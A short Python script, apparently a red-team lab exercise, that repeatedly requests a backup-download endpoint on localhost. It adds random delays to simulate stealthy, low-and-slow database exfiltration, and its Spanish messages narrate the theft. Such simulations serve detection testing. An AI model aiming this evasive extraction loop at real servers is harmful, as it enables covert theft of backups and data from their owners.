import urllib.request
import time
import random

OBJETIVO = "http://127.0.0.1:8000/?accion=descargar_respaldo"
CHUNKS_A_ROBAR = 50

print("=====================================================")
print("  Iniciando simulación Red Team: Exfiltración Sigilosa")
print("=====================================================")
print(f"Objetivo: {OBJETIVO}")
print("Extrayendo base de datos gota a gota...\n")

for i in range(CHUNKS_A_ROBAR):
    try:
        urllib.request.urlopen(OBJETIVO)
        print(f"[+] Paquete {i+1}/{CHUNKS_A_ROBAR} extraído. Silenciando conexión...")
    except Exception:
        print("[-] Error al conectar con el servidor.")

    pausa = random.randint(1, 3)
    time.sleep(pausa)
print("\n[!] Exfiltración completada. Base de datos comprometida.")
